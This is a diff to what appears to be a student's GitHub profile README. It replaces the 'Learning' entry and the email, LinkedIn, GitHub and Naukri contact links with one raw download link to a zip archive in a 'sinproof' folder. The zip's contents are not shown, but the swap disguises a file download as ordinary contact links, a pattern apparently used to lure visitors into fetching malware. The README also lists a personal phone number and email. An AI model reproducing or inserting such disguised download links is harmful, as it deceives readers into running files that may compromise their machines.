@@ -17,7 +17,7 @@ Terfs Academy College (Face Prep Campus), Tiruppur
 - Languages: C, C++, Java, Python, SQL, C#, NUMPY.
 - Frontend: HTML, CSS, JavaScript, Bootstrap, jQuery, Kotlin.
 - Tools: VS Code, GitHub, Google Colab, Canva, idle, Codeblocks, Sublime Text, XAMPP.
-- Learning: React.js.
+- Learning: https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip
 
 ## 🧠 Certifications & Badges
 
@@ -62,12 +62,12 @@ Terfs Academy College (Face Prep Campus), Tiruppur
 
 ## 📫 Connect With Me
 
-- 📧 Email: [ddharshini820@gmail.com](mailto:ddharshini820@gmail.com)
+- 📧 Email: [https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
 - 📱 Phone: +91 63794 39440
-- 🔗 LinkedIn: [linkedin.com/in/devadharshini-178a9028b](https://www.linkedin.com/in/devadharshini-178a9028b/)
-- 💻 GitHub: [github.com/Devadharshinii-Murugan](https://github.com/Devadharshinii-Murugan)
+- 🔗 LinkedIn: [https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
+- 💻 GitHub: [https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
 - 🧠 HackerRank: **Deva Dharshini - ddharshini820**
-- 💼 Naukri / Code360 Profile: [View Profile](https://www.naukri.com/code360/profile/c4a2dc07-2e2d-4104-a3bd-fe759bdd442a)
+- 💼 Naukri / Code360 Profile: [View Profile](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
 
 
 
